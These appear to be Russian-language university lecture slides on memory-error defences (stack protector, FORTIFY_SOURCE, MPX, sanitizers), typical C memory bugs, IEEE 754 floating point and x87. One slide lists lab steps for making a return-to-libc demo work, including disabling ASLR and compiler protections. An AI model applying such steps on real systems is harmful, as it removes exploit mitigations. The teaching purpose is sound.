    0              1            mov     dword [ebp-20], 1
                                mov     dword [ebp-16], 2
    1              2            mov     dword [ebp-12], 3
    2              3            mov     eax, dword [ebp-20+eax*4]
    3       b7702030            mov     dword [esp+4], .LC0
                                mov     dword [esp], 1
    4        8049ff4            mov     dword [esp+8], eax
    5       bfbcb3b8            call    __printf_chk
    6        804846b            leave
                                ret
    7              7
    8       b781aff4
                                                                  11
    9        8048490
                                                                  © 2024 МГУ/ВМК/СП
• Технология борьбы с
  ошибками на этапе
  компиляции
• В последних версиях      GCC: FORTIFY_SOURCE                        gcc 4.4.3
  компилятора gcc по-
                                        foo:
  умолчанию включается
  вместе с оптимизацией.                   push    ebp
                                           mov     ebp, esp
                                           sub     esp, 56
void foo(char *string) {                   mov     eax, dword [gs:20]
   char buf[20];                           mov     dword [ebp-12], eax
   strcpy(buf, string);                    xor     eax, eax
}                                          mov     eax, dword [ebp+8]
                                           mov     dword [esp+8], 20
foo:                                       mov     dword [esp+4], eax
   push        ebp                         lea     eax, [ebp-32]
   mov         ebp, esp                    mov     dword [esp], eax
   sub         esp, 56                     call    __strcpy_chk
   mov         eax, dword [ebp+8]          mov     eax, dword [ebp-12]
   mov         dword [esp+4], eax          xor     eax, dword [gs:20]
   lea         eax, [ebp-28]               jne     .L5
   mov         dword [esp], eax                           stack-protector
                                           leave
   call        strcpy                                     +
                                           ret
   leave                                                  FORTIFY_SOURCE
                 Отключается макросом   .L5:
                                                                         12
   ret           -D_FORTIFY_SOURCE=0       call    __stack_chk_fail
                                                                            © 2024 МГУ/ВМК/СП



                      Что было сделано,
            чтобы пример «return-to-libc» заработал
      1.      Отключена рандомизация адресного пространства
             – sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
      2.      Отключена защита стека и Fortify Source
             – -D_FORTIFY_SOURCE=0 -fno-stack-protector
      3.      Программа статически собрана; в коде непосредственно
              присутствует вызов функции system
             – -static -static-libgcc
      4.      Построение позиционно независимого кода было отключено, код
              распределен на определенные адреса памяти
             – -fno-pic -no-pie
      5.      Код программы оптимизирован, но функцию f защитили от
              встраивания
             – -fno-inline-small-functions
      6.      Определение адреса на стеке проводилось в специально
              подготовленном окружении, исключающим влияние отладчика на
              работу программы
      7.      Делать стек работоспособным не надо, необходимый для атаки код
              уже размещен в программе ее же автором 
                                                                                   13
Работает на Ubuntu 22.04 c gcc 11.3.0
                                                                                    © 2024 МГУ/ВМК/СП



         Защита памяти на уровне процессора:
              Capability-based addressing
                                                                                           Адреса
•   Вместо доступа к памяти по указателям (адресам)
    используются дескрипторы. Дескриптор задает:
     –   Границы памяти, в пределах которых санкционирован
         доступ
     –   Дополнительные права доступа                        [ адрес памяти ]
•   Управлять дескрипторами может только
    операционная система или выделенная
    привилегированная программа
•   System 250, Plessey Company, 1969                                             Массив
     –   Первый компьютер, реализовавший идею                Размер   Смещение
•   Intel iAPX 432, 1981
     –   Проиграл архитектуре x86 по скорости работы
                                                         Флаги    Базовый адрес
     –   В 1985 был снят с производства                         Дескриптор
•   Эльбрус, МЦСТ, защищенный режим выполнения
    программ
     –   Доступ к памяти через дескрипторы
     –   Тегирование памяти
     –   Теневой стек адресов возврата
•   CHERI (2014), CHEx86 (2020) Университет Кембриджа
•   Fat Pointer – хранение указателя с дополнительными
    атрибутами на уровне языка программирования или
    библиотеки

                                                                                           14
                                                                                                 © 2024 МГУ/ВМК/СП




     Intel MPX – Memory Protection Extensions
                                                                                  struct obj {
                                                                                     char buf[100];
                                                                                     int len
•   Технология представлена в 2015 году                                           };
•   7 новых команд и набор служебных                                              …
    регистров для хранения границ буферов                                         obj* a[10];
                                                                                  for (i=0; i<M; i++) {
    памяти                                                                           total += a[i]->len;
•   Поддержка в gcc и icc                                                         }
     –   gcc -fcheck-pointer-bounds –mmpx
                                            1: obj* a[10]
     –   Для каждого адресуемого места      2: a_b = bndmk a, a+79       // Создаем границы [a, a+79]
         памяти заводится дескриптор,       3: total = 0
         описывающий границы                4: for (i=0; i<M; i++):
     –   Обращения к памяти предваряются    5:     ai = a + i
         командами проверки, что нет        6:     bndcl a_b, ai         // Проверка нижней границы a[i]
                                            7:     bndcu a_b, ai+7       // Проверка верхней границы a[i]
         выхода за границы. При нарушении
                                            8:     objptr = load ai
         границ возникает Исключение,       9:     objptr_b = bndldx ai     // Границы для указателя a[i]
         операционная система               10:    lenptr = objptr + 100
         незамедлительно завершает          11:    bndcl objptr_b, lenptr   // Проверка нижней границы
         программу.                                                         // obj.len
•   Ложные срабатывания!                    12:    bndcu objptr_b, lenptr+3 // Проверка верхней границы
                                                                            // obj.len
     –   int array[]                        13:    len = load lenptr
•   В 2019 году поддержка                   14:    total += len

    технологии была прекращена
     –   Проигрыш санитайзерам по
         скорости работы                                                                                15
                                            Design of Intel MPX
                                            https://intel-mpx.github.io/design/
                                                                                                © 2024 МГУ/ВМК/СП




                                      Санитайзеры
•   В код программы во время компиляции встраивается инструментальный код – датчики
    срабатывания ошибок.
•   Механизм компилятора, который встраивает такой код – санитайзер.
•   Санитайзеры сперва появились в компиляторе llvm, затем – и в остальных gcс, ms vc
     –   Стратегия Google по разработке инструментов анализа программ, которые не дают ложных
         срабатываний, т.е. не расходуют время программиста попусту
•   Санитайзеры позволяют во время выполнения программы фиксировать ситуации
    срабатывания «тихих» ошибок, таких как дефекты работы с памятью и не только …
     –   AddressSanitizer
     –   ThreadSanitizer                    Что ловит?
     –   MemorySanitizer                    •   Переполнения буфера
                                            •   Использование после освобождения
     –   UndefinedBehaviorSanitizer
                                            •   Утечки памяти
     –   DataFlowSanitizer
                                            •   Использование вне области видимости
     –   LeakSanitizer
•   Компилятор проводит анализ, в каких местах встраивание проверок нужно, а в каких – нет.
     –   Каждый санитайзер вносит умеренное замедление, порядка 15%
     –   Для некоторых санитайзеров требуется дополнительная память для хранения служебной информации
•   Легкое использование – просто добавь ключ, например -fsanitize=address …
•   Недостаток общий для всех методов динамического анализа – если нет теста, на котором
    ошибка срабатывает, вы о ней не узнаете
                                                          https://clang.llvm.org/docs/index.html

                                                                                                       16
                                                                                                                     © 2024 МГУ/ВМК/СП



       Карта методов эксплуатации ошибок работы
            с памятью и технологии защиты




 На рисунке цветом выделены рассмотренные
                                                    Источник:
  методы и технологии                               Mohamed (Tarek Ibn Ziad) Hassan. Why is memory safety still a concern?
  Карта не полная, на ней нет санитайзеров, MPX,    PhD Candidacy Exam                                                       17
  capability-based addressing и многого другого …   https://www.cs.columbia.edu/~mtarek/files/candidacy_exam_syllabus.pdf
                                             © 2024 МГУ/ВМК/СП




  Типичные ошибки при работе с памятью

• Разыменование дефектного указателя
• Чтение неинициализированной памяти
• Перезапись памяти
• Ссылки на не существующие переменные
• Многократное освобождение блоков памяти
• Ссылки на уже освобожденные блоки
• Ошибки, связанные с освобождением блоков



                                                    18
                                                                 © 2024 МГУ/ВМК/СП




                   Операции в языке Си
 Операторы                                     Ассоциативность
 () [] -> .                                    слева направо
 ! ~ ++ -- + - * & (type) sizeof               справа налево
 * / %                                         слева направо
 + -                                           слева направо
 << >>                                         слева направо
 < <= > >=                                     слева направо
 == !=                                         слева направо
 &                                             слева направо
 ^                                             слева направо
 |                                             слева направо
 &&                                            слева направо
 ||                                            слева направо
 ?:                                            справа налево
 = += -= *= /= %= &= ^= != <<= >>=             справа налево
 ,                                             слева направо
                                                                  *p->
• ->, (), и [] имеют более высокий приоритет, чем * и &
• Унарные операции +, -, и * имеют больший приоритет, нежели их
                                                                        19
 бинарные аналоги     Источник: «Керниган & Ричи»
                                                         © 2024 МГУ/ВМК/СП




   Разыменование дефектного указателя

• Классическая ошибка при использовании
  функции scanf

 int val;

 ...

 scanf(“%d”, val);


       Используем значение переменной вместо ее адреса



                                                                20
                                                           © 2024 МГУ/ВМК/СП




    Чтение неинициализированной памяти

Ошибочное предположение, что память, полученная из кучи,
предварительно была заполнена нулями



        /* вычисляем y = Ax */
        int *matvec(int **A, int *x) {
           int *y = malloc(N*sizeof(int));
           int i, j;

            for (i=0; i<N; i++)
               for (j=0; j<N; j++)
                  y[i] += A[i][j]*x[j];
            return y;
        }
                                                                  21
                                                            © 2024 МГУ/ВМК/СП




                  Перезапись памяти

Выделение памяти с неправильным определением размеров
(в некоторых случаях)


       int **p;

       p = malloc(N*sizeof(int));

       for (i=0; i<N; i++) {
          p[i] = malloc(M*sizeof(int));
       }


                             Что будет, если такой код
                             перенести с IA-32 на x86-64?
                                                                   22
                                             © 2024 МГУ/ВМК/СП




                  Перезапись памяти

Ошибка диапазона валидных значений индекса



       int **p;

       p = malloc(N*sizeof(int *));

       for (i=0; i<=N; i++) {
          p[i] = malloc(M*sizeof(int));
       }




                                                    23
                                                             © 2024 МГУ/ВМК/СП




                   Перезапись памяти

Не проверяется превышение максимального размера вводимой строки
Основа для реализации классической атаки «переполнение буфера», в
реальной жизни gets почти перестал встречаться.


char s[8];
int i;

gets(s);   /* читаем “123456789” со стандартного входа */




                                                                    24
                                                            © 2024 МГУ/ВМК/СП




                   Перезапись памяти

Неправильное понимание адресной арифметики, в языке Си считаем не
отдельные байты, а элементы типа, на который указываем.


        int *search(int *p, int val) {

            while (*p && *p != val)
               p += sizeof(int);

            return p;
        }




                                                                   25
                                                            © 2024 МГУ/ВМК/СП




   Ссылки на не существующие переменные

Автоматические локальные переменные перестают существовать после
выхода из функции


        int *foo () {
           int val;

            return &val;
        }




                                                                   26
                                     © 2024 МГУ/ВМК/СП




Многократное освобождение блоков памяти

• Фу!


        x = malloc(N*sizeof(int));
              // что-то делаем с x
        free(x);

        y = malloc(M*sizeof(int));
              // что-то делаем с y
        free(x);




                                            27
                                        © 2024 МГУ/ВМК/СП




    Ссылки на уже освобожденные блоки

• Фу-фу-фу!


     x = malloc(N*sizeof(int));
        // что-то делаем с x
     free(x);
        ...
     y = malloc(M*sizeof(int));
     for (i=0; i<M; i++)
        y[i] = x[i]++;




                                               28
                                           © 2024 МГУ/ВМК/СП



Ошибки, связанные с освобождением блоков
             (утечка памяти)
• Долгое, но верное «убийство» программы


     foo() {
        int *x = malloc(N*sizeof(int));
        ...
        return;
     }




                                                  29
                                                    © 2024 МГУ/ВМК/СП



Ошибки, связанные с освобождением блоков
             (утечка памяти)
• Освобождаем только часть сложно устроенной
  структуры данных
struct list {
   int val;
   struct list *next;
};

foo() {
   struct list *head = malloc(sizeof(struct list));
   head->val = 0;
   head->next = NULL;
   // создаем и что-то делаем с остальной частью списка
    ...
   free(head);
   return;
                                                        30
}
                                                              © 2024 МГУ/ВМК/СП




         И что же со всем этим делать?

• Традиционный отладчик (gdb)
  – Удобно находить разыменование дефектных указателей
  – Совсем неудобно выявлять все остальные виды ошибок
                                      При срабатывании ошибки крайне
• Отладочная версия malloc            важна выдаваемая диагностика!
  – Обертка вокруг обычной функции malloc
  – Выявление ошибок в рамках функций malloc и free
     • Повреждение внутренних структур кучи в результате перезаписи
     • В некоторых случаях – многократное освобождение памяти
     • Утечки памяти
  – Не может выявлять все остальные ошибки
     • Перезаписи внутри выделенных блоков
     • Использование уже освобожденных блоков
     • …
                                                                      31
                                                                        © 2024 МГУ/ВМК/СП




           И что же со всем этим делать?

• Некоторые реализации malloc уже содержат код
  дополнительных проверок
   – glibc malloc в ОС Linux: setenv MALLOC_CHECK_ 2
   – FreeBSD: setenv MALLOC_OPTIONS AJR
• Программные инструменты динамического анализа
   – Санитайзеры!
   – valgrind (ОС Linux), DynamoRIO, PIN
       • Двоичная трансляция
   – Работают с исполняемы кодом программы
   – Может выявлять все ошибки, что и отладочный malloc
   – А также проверяет все обращения к памяти во время выполнения
     программы
                                     • Дают детальную диагностику, если ошибка
       • Дефектные указатели           сработала
       • Перезапись памяти           • Нужны начальные данные, на которых
       • Ссылка вне выделенных         ошибки будут проявляться
         блоков памяти
• Нужна общие принципы разработки безопасного ПО
                                                                               32
                            © 2024 МГУ/ВМК/СП




Разработка безопасного ПО




                                   33
                                                                                                                  © 2024 МГУ/ВМК/СП
#include <stdio.h>                                                               f:
#include <string.h>                                                                 endbr32
                                                                                    push    esi
void f(FILE* fd, char* output) {                                                    push    ebx
   char buf[19];                                                                    sub     esp, 36
                                                                                    mov     eax, dword [gs:20]
    fgets(buf, 20, fd);                                                             mov     dword [esp+28], eax
                                                                                    xor     eax, eax
    if (0 == strncmp(buf, "Accept: ", 8)) {                                         mov     esi, dword [esp+52]
                                                                                    push    dword [esp+48]
       strcpy(output, buf);
                                                                                    push    20
    }
                                                                                    push    19
}
                                                                                    lea     ebx, [esp+21]
                                                                                    push    ebx
gcc -m32 -O3 -masm=intel -S -fno-PIC -static-libgcc -static -Wno-unused-result      call    __fgets_chk
def-sample.c                                                                        add     esp, 16
In file included from /usr/include/stdio.h:867,
        from def-sample.c:1:                                                        cmp     dword [esp+9], 0x65636341
In function ‘fgets’,                                                                je      .L8
    inlined from ‘f’ at def-sample.c:7:4:
/usr/include/bits/stdio2.h:263:9: warning: call to ‘__fgets_chk_warn’ declared
                                                                                 .L1:
with attribute warning: fgets called with bigger size than length of                mov     eax, dword [esp+28]
destination buffer [-Wattribute-warning]                                            xor     eax, dword [gs:20]
  263 | return __fgets_chk_warn (__s, __bos (__s), __n, __stream);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                      jne     .L9
user@user-VirtualBox:~/asm$ gcc –v                                                  add     esp, 36
…
gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)                                   pop     ebx
                                                                                    pop     esi
                                                                                    ret
•    Какое соглашение вызова используется в функции f?                           .L8:
•    Используется ли указатель фрейма?                                              cmp     dword [esp+13], 0x203A7470
                                                                                    jne     .L1
•    Как устроен фрейм функции f?                                                   sub     esp, 8
       • Сохраненные регистры                                                       push    ebx
       • Автоматические локальные переменные                                        push    esi
       • Пространство аргументов                                                    call    strcpy
                                                                                    add     esp, 16
•    Какие защитные механизмы используются?
                                                                                    jmp     .L1
                                                                                 .L9:
                                                                                                                         34
                                                                                    call    __stack_chk_fail
                                           © 2024 МГУ/ВМК/СП




                          Далее ...

• Числа с плавающей точкой
  – Представления для вещественных чисел
     • Дробные двоичные числа
     • Числа с плавающей точкой
  – Сопроцессор x87
     • Устройство
     • Примеры программ
• Динамическая память
  – Организация и управление
  – Численные характеристики
  – Управление свободными блоками
  – Сборка мусора

                                                  35
             © 2024 МГУ/ВМК/СП




Лекция 0xE


 3 апреля
                                                                       © 2024 МГУ/ВМК/СП




                Дробные двоичные числа
                                          2i
                                      2i-1

                                          4
               •••                        2
                                          1
      bi bi-1 •••    b2   b1         b0        b-1 b-2 b-3   ••• b-j
                               1/2
                               1/4                           •••
                               1/8


• Представление числа          2-j
 – Биты справа от “двоичной точки” представляют отрицательные степени 2
 – Точное представление для рациональных чисел вида :
                                                                               2
                                                     © 2024 МГУ/ВМК/СП




        Примеры дробных двоичных чисел

Число             Представление
 5 3/4            101.112
 2 7/8            10.1112
 63/64            0.1111112


• Деление на 2 может выполняться сдвигом вправо, …
• … а умножение на 2 – сдвигом влево
• Числа вида 0.11111…2
  • На один «шаг» меньше чем 1.0
  • Используется специальное обозначение 1.0 – ε


                                                             3
                                                          © 2024 МГУ/ВМК/СП




         Представимые рациональные числа

• Ограничение
  – Можно представить рациональные числа только вида x/2k
  – Другие рациональные числа представляются повторяющимися
    группами бит


• Число       Представление
  1/3         0.0101010101[01]…2
  1/5         0.001100110011[0011]…2
  1/10        0.0001100110011[0011]…2




                                                                  4
                                                                  © 2024 МГУ/ВМК/СП




   Представление чисел с плавающей точкой
• Определено в стандарте IEEE 754
• Численное представление
                     (–1)s × M × 2E
  – Знаковый бит s определяет, является число положительным или
    отрицательным
  – Мантисса M – дробное число в полуинтервале
      – Для нормализованных – [1.0, 2.0)
      – Для денормализованных - [0.0, 1.0)
  – Порядок E определяет степень 2 в третьем множителе

• Кодировка
  – Наибольший значащий бит s – знаковый бит s
  – Поле exp кодирует порядок E
  – Поле frac кодирует мантиссу M

   s exp             frac
                                                                          5
                                                            © 2024 МГУ/ВМК/СП




                      Размеры чисел
• Одинарная точность: 32 бита. Тип – float.
  – Знак s           1 бит
  – Мантисса M       23 бита
  – Порядок E        8 битов


• Двойная точность: 64 бита. Тип – double.
  – Знак s           1 бит
  – Мантисса M       52 бита
  – Порядок E        11 битов


• Нормализация чисел
  – Нормализованное значение – порядок не принимает «крайние»
    значения (одни нули или одни единицы)
                                                                    6
  – Денормализованное значение – порядок либо ноль, либо 11…11
                                                        © 2024 МГУ/ВМК/СП




                Нормализованное число
• Значение: float f = 15213.0;
  1521310     = 111011011011012
                           = 1.11011011011012 x 213

• Мантисса
   M            =   1.11011011011012
   frac         =   110110110110100000000002
• Порядок
   E            =   13
   Смещение     =   127
   Exp          =   E + Смещение = 140 = 100011002
   Смещение     =   2k-1-1, где k – число разрядов в поле Exp
• Итого:

 0 10001100          11011011011010000000000
                                                                7
 s      exp                        frac
                                                        © 2024 МГУ/ВМК/СП




               Денормализованное число

• Условие: exp = 000…0
• Значение порядка: E = 1 – Смещение
  (вместо E = 0 – Смещение)
• Мантисса кодируется с ведущим 0: M = 0.xxx…x2
  – xxx…x: биты поля frac
• Примеры
  – exp = 000…0, frac = 000…0
     • Представляет число ноль
     • Различные кодировки для +0 и –0
  – exp = 000…0, frac ≠ 000…0
     • Кодируются числа близкие к 0.0
     • Распределены по числовой прямой с равным шагом
                                                                8
                                                              © 2024 МГУ/ВМК/СП




                       Особые числа

• Условие: exp = 111…1
• Пример: exp = 111…1, frac = 000…0
  – Представляет бесконечно большое число 
    (как положительное, так и отрицательное)
  – Требуются для операций в которых может произойти переполнение
       1.0/0.0 = −1.0/−0.0 = +
       1.0/−0.0 = −
• Пример: exp = 111…1, frac ≠ 000…0
  – Not-a-Number (NaN)
  – Используется в ситуациях, когда значение операции не определено
       sqrt(–1)
        − 
         0
                                                                      9
                                                                  © 2024 МГУ/ВМК/СП




                    Диапазоны значений



  −                                                               +
       −Нормализованные −Денорм.    +Денорм.   +Нормализованные


NaN                                                                   NaN
                              0   +0




                                                                         10
                                                            © 2024 МГУ/ВМК/СП




                           Пример

            s     exp            frac
            1   4 бита          3 бита

• 8-разрядные числа с плавающей точкой
  – Знаковый бит – старший бит
  – Следующие четыре бита – порядок, смещение – 7
  – Последние три бита – дробная часть (мантисса)


• Выполнены все требования стандарта IEEE 754 к формату
  числа
  – Реализованы нормализованные и денормализованные числа
  – Представлены значения 0, NaN, бесконечность
                                                                   11
                                                                © 2024 МГУ/ВМК/СП

                    Диапазоны значений
              (только для положительных чисел)
             s exp   frac   E     Значения

               0 0000 000   -6    0
               0 0000 001   -6    1/8*1/64 = 1/512   Ближайшее к 0
               0 0000 010   -6    2/8*1/64 = 2/512
Денормализованные
числа          …
               0 0000 110   -6    6/8*1/64 = 6/512
                                                     Наибольшее денорм.
               0 0000 111   -6    7/8*1/64 = 7/512
               0 0001 000   -6    8/8*1/64 = 8/512   Наименьшее норм.
               0 0001 001   -6    9/8*1/64 = 9/512
               …
               0 0110 110   -1    14/8*1/2 = 14/16
               0 0110 111   -1    15/8*1/2 = 15/16   Ближайшее к 1 «снизу»
               0 0111 000   0     8/8*1    = 1
               0 0111 001   0     9/8*1    = 9/8     Ближайшее к 1 «сверху»
               0 0111 010   0     10/8*1   = 10/8
Нормализованные
               …
числа
               0 1110 110   7     14/8*128 = 224
               0 1110 111   7     15/8*128 = 240     Наибольшее норм.
               0 1111 000   n/a   inf
                                                                        12
                                                                  © 2024 МГУ/ВМК/СП




   Распределение значений по числовой прямой

• 6-разрядный формат
  • e = 3 бита порядка            s      exp              frac
  • f = 2 бита мантиссы
                                  1    3 бита            2 бита
  • Смещение 23-1-1 = 3
• Распределение сильно «сгущается» в окрестности 0

                                            8 значений


 -15        -10         -5          0          5            10            15
                      Денорм.   Норм.   Бесконечность




                                                                         13
                                                                      © 2024 МГУ/ВМК/СП



 Распределение значений по числовой прямой
                (вид вблизи)
• 6-разрядный формат
  • e = 3 бита порядка              s        exp               frac
  • f = 2 бита мантиссы
                                    1       3 бита           2 бита
  • Смещение 3




   -1              -0,5                 0                    0,5                  1
                          Денорм.   Норм.    Бесконечность




                                                                             14
                                                                       © 2024 МГУ/ВМК/СП




                        Некоторые числа

Описание                         exp     frac    Численное значение
• Ноль                           00…00   00…00   0.0
• Наименьшее «+» денорм.         00…00   00…01   2– {23,52} x 2– {126,1022}
  – Одинарная точность ≈ 1.4 x 10–45
  – Двойная точность ≈ 4.9 x 10–324
• Наибольшее денорм.             00…00   11…11   (1.0 – ε) x 2– {126,1022}
  – Одинарная точность ≈ 1.18 x 10–38
  – Двойная точность ≈ 2.2 x 10–308
• Наименьшее «+» норм.           00…01   00…00   1.0 x 2– {126,1022}
  – Немногим больше чем наибольшее денормализованное
• Единица                        01…11   00…00   1.0
• Наибольшее норм.               11…10   11…11   (2.0 – ε) x 2{127,1023}
  – Одинарная точность ≈ 3.4 x 1038
                                                      Точность
  – Двойная точность ≈ 1.8 x 10308                               15
                                                 {одинарная,двойная}
                                                                     © 2024 МГУ/ВМК/СП




                   Особенности кодировки

• FP ноль совпадает с целочисленным нулем
  • Все биты = 0


• Допустимо (в большинстве случаев) использовать
  беззнаковое целочисленное сравнение
  • Сперва сравниваем знаковые биты
  • Необходимо рассматривать −0 = 0
  • NaNs
    • В целочисленной интерпретации больше, чем любые другие числа
    • Что необходимо выдавать в качестве результата сравнения?
  • В противном случае …
    • Денормализованные vs. Нормализованные
    • Нормализованные vs. Бесконечность
                                                                            16
                                                      © 2024 МГУ/ВМК/СП




 Операции над числами с плавающей точкой

• x +f y = Round(x + y)

• x f y = Round(x  y)

• Основная идея
  – Сперва вычислить точный результат
  – Поместить результат в требуемый размер точности
    • Переполнение, если порядок слишком большой
    • Возможно придется округлять поле frac




                                                             17
                                                         © 2024 МГУ/ВМК/СП




                           Округление

• Способы округления

•                          1.40   1.60   1.50   2.50   –1.50
    – К нулю               1      1      1      2      –1
    – К наименьшему (−)   1      1      1      2      –2
    – К наибольшему (+)   2      2      2      3      –1
    – К ближайшему ()     1      2      2      2      –2




                                                                18
                                                                    © 2024 МГУ/ВМК/СП




   Округление к ближайшему целому числу

• Основной способ округления
  – Все остальные способы дают статистическое смещение
    • Пример: суммирование положительных чисел будет давать устойчивую
      недо- или пере- оценку результата

• Применимо при округлении в произвольной позиции
  дроби
  – Когда число расположено точно посредине двух значений к которым
    можно округлить
    • Округляют к тому числу, у которого наименьшая значащая цифра четная
  – Например, округление до ближайших сотых
      1.2349999        1.23
      1.2350001        1.24
      1.2350000        1.24     (середина — округляем к большему)
                                                                           19
      1.2450000        1.24     (середина — округляем к меньшему)
                                                              © 2024 МГУ/ВМК/СП




             Округление двоичных чисел

• Двоичные дробные числа
  – “Четные” числа у которых младший значащий бит 0
  – “Середина” – когда биты справа от позиции к которой происходит
    округление = 100…2


• Примеры
  – Округление до ближайшей 1/4 (2 бита справа от бинарной точки)

  Число      Двоичное      Окр.        Действие         Окр. число
  2 3/32     10.000112     10.002      (<1/2—down)      2
  2 3/16     10.001102     10.012      (>1/2—up)        2 1/4
  2 7/8      10.111002     11.002      ( 1/2—up)        3
  2 5/8      10.101002     10.102      ( 1/2—down)      2 1/2      20
                                                               © 2024 МГУ/ВМК/СП




                          Умножение

• (–1)s1 M1 2E1 x (–1)s2 M2 2E2
• Точный результат: (–1)s M 2E
  – Знаковый бит s:    s1 ^ s2
  – Мантисса M:        M1 x M2
  – Порядок E: E1 + E2


• Исправление
  – Если M ≥ 2, сдвигаем M вправо (делим на 2), увеличивая E
  – Если E выходит за пределы, переполнение
  – Округляем M до соответствующего размера поля frac



                                                                      21
                                                                   © 2024 МГУ/ВМК/СП




                           Сложение

• (–1)s1 M1 2E1 + (-1)s2 M2 2E2
   – Пусть E1 > E2                                                 E1–E2
                                             (–1)s1 M1
• Точный результат: (–1)s M 2E
  – Знаковый бит s, мантисса M:
                                      +                        (–1)s2 M2

    • Результат выравнивания и сложения
                                                         (–1)s M
  – Порядок E:   E1


• Исправление
  – Если M ≥ 2, сдвигаем M вправо, увеличивая E
  – Если M < 1, сдвигаем M влево на k позиций, уменьшая E на k
  – Переполнение если E выходит за пределы
                                                                          22
  – Округляем M до соответствующего размера поля frac
                                                                    © 2024 МГУ/ВМК/СП




      Математические свойства сложения

• Выполняются ли свойства Абелевых групп
 – Замкнутость?                                            Да
    • Результатом может быть бесконечность или NaN
 – Коммутативность?                                        Да
 – Ассоциативность?
                                                           Нет
    • Переполнения и изменение результата при округлении
 – 0.0 – нейтральный элемент?                              Да
 – Каждый элемент имеет обратный                           Почти
    • За исключением бесконечности и NaN                   всегда
• Монотонность
 – a ≥ b ⇒ a+c ≥ b+c?                                      Почти
    • За исключением бесконечности и NaN                   всегда

                                                                           23
                                                                  © 2024 МГУ/ВМК/СП




      Математические свойства умножения

• Выполняются ли свойства коммутативных колец
  – Замкнуто ли относительно умножения?      Да
     • Результат может быть бесконечность или NaN
  – Умножение коммутативно?                              Да
  – Умножение ассоциативно?                              Нет
     • Возможность переполнения, неточности округления
  – 1.0 – мультипликативная единица?                     Да
  – Умножение дистрибутивно над сложением?               Нет
     • Возможность переполнения, неточности округления



• Монотонность                                           Почти
  – a ≥ b & c ≥ 0 ⇒ a * c ≥ b *c?                        всегда
     • Исключение – бесконечность и NaN                                  24
                                                                  © 2024 МГУ/ВМК/СП




     Числа с плавающей точкой в языке Си

• Язык Си вводит два уровня точности
  – float      одинарная точность
  – double     двойная точность

• Приведение типа
  – Приведение типа между int, float, и double включает изменение
    битового представления
  – double/float → int
    • Отбрасывается дробная часть (аналогично округлению к нулю)
    • Поведение не определено, когда значение вне допустимого диапазона
      или NaN: как правило устанавливается TMin
  – int → double
    • Точное приведение, поскольку long и int 32 бита ≤ 53 бита
  – int → float                                                           25
    • Будет округляться согласно принятым соглашениям
                                                         © 2024 МГУ/ВМК/СП




                            Задачи

• Для каждого Си-выражения объяснить:
  – почему оно верно для любого значения переменных, …
  – … либо почему ложно • x == (int)(double) x
                          • x == (int)(float) x
int x = …;                • f == (float)(double) f
float f = …;              • d == (float) d
double d = …;             • f == -(-f);
                          • 2/3 == 2/3.0
Предполагается, что
                          • d < 0.0      ⇒    ((d*2) < 0.0)
d и f не являются NaN
                          • d > f        ⇒    -f > -d
                          • d * d >= 0.0
                          • (d+f)-d == f
                                                                26
                                                            © 2024 МГУ/ВМК/СП



             Числа с плавающей точкой:
               промежуточные итоги
• IEEE 754 – четкое определение математических свойств
• Представляются числа вида ±M × 2E
• Семантика операций не зависит от особенностей
  аппаратуры
  – Сперва точное вычисление, затем округление
• Отличия от «настоящей» арифметики
  – Нарушаются свойства ассоциативности и дистрибутивности
  – Создаются сложности для компилятора и серьезных математических
    вычислений




                                                                   27
                                        © 2024 МГУ/ВМК/СП




Упрощенная схема x87




       Инициализация x87 – инструкция FINIT
   CW = 0x037F   SW = 0x0000              28
                                Tag = 0xFFFF
                                                      © 2024 МГУ/ВМК/СП




            Размер чисел с плавающей точкой
                        Регистры данных
     Знак
              Порядок       Мантисса




                        Обмен данными только с памятью!


dd 1.234567e20 ; Константы одинарной точности
dq 1.234567e20 ; Двойной точности
dt 1.234567e20 ; Расширенной точности                        29
                                                                          © 2024 МГУ/ВМК/СП




                   Слово (регистр) состояния

  •   B – признак того, что процессор занят вычислениями (busy)
  •   TOP – верхушка стека регистров, номер физического регистра
  •   С0-3 – коды условий для операций сравнения
  •   SF – переполнение стека (C1 показывает направление)
  •   Исключительные ситуации: точность, переполнение, деление на ноль,
      денормализованный операнд, «неправильные» данные, …




Инициализация x87
инструкция FINIT
SW = 0x0000                                                                      30
                                                                            © 2024 МГУ/ВМК/СП




                                 Прерывания

•   Прерывание — реакция аппаратуры процессора на возникновение
    некоторого события в виде передачи управления специальной процедуре,
    называемой обработчиком прерываний.
•   Исключение – частный случай прерывания. Одна из причин возникновения
    исключения – сбой выполнения машинной команды.
Продолжение работы после обработки прерывания   Завершение работы
        Программа         Обработчик              Программа         Обработчик




                                                                                   31
Время
                                                                                             © 2024 МГУ/ВМК/СП




                Исключительные ситуации x87
•   #IA – не валидный арифметический операнд (0/0, корень отрицательного числа, … )
•   #Z – попытка делить на 0
•   #P – Результат пришлось округлять
•   #U – результат (по модулю) меньше, чем самое малое нормализованное число
•   #O – численное переполнение
•   #D – операнд – денормализованное число
•   #IS – сбой работы со стеком регистров (overflow/underflow). Попытка поместить на стек
    регистров, когда все 8 регистров уже чем-то заняты.

•   Любые нетривиальные вычисления в какой-то момент прервутся возникшим исключением?
     –   Нет, если применяется корректный численный метод, программа не содержит ошибок, …
     –   «Естественный» ход выполнения программы – без исключений

•   Все исключения, кроме #IS, могут быть замаскированы, т.е. проигнорированы, управление не
    будет передаваться обработчику.
     –   Команда в любом случае обязана выработать результат
     –   Решение: разделение NaN на две категории, сигнальный NaN (SNaN) и «тихий» NaN (QNaN).
         Маскированное поведение при невозможности вычислить корректный результат вырабатывает
         QNaN.




                                                                                                    32
                                                             © 2024 МГУ/ВМК/СП




                    Управляющий регистр
  • Точность: одинарная, двойная, расширенная
  • Округление: к ближайшему четному, к нулю,
    к +/- бесконечности
  • Флаг X – совместимость с 287 в части обработки псевдо-
    денормализованных чисел (из эпохи до принятия первой
    редакции стандарта IEEE 754 в 1985 году )
  • Маски соответствуют исключениям в слове состояния




Инициализация x87
инструкция FINIT
CW = 0x037F                                                         33
                                                           © 2024 МГУ/ВМК/СП




                Регистр признаков (тагов)

  • Состояние регистров
      – 0 – нормализованное число с плавающей точкой
      – 1 – число ноль
      – 2 – особые числа (NaN, ± ∞, денормализованное число)
      – 3 – регистр свободен
  • Нумерация соответствует физическим регистрам




Инициализация x87
инструкция FINIT
Tag = 0xFFFF                                                      34
